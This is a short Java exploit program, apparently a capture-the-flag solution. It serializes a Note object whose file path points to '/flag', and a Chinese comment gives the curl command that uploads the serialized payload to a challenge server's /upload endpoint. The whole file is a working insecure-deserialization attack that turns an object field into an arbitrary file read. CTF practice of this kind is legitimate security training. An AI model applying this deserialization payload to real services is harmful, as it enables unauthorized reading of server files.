import java.io.ObjectOutputStream;
import java.io.FileOutputStream;

// 命令：curl -X POST http://challenge.shc.tf:30239/upload -H "Content-Type: application/octet-stream" --data-binary @ser.bin

public class EXP {
    public static void main(String[] args) throws Exception{
        Note note = new Note("title","message","/flag");
        FileOutputStream fos = new FileOutputStream("ser.bin");
        ObjectOutputStream oos = new ObjectOutputStream(fos);
        oos.writeObject(note);
        oos.close();
    }
}
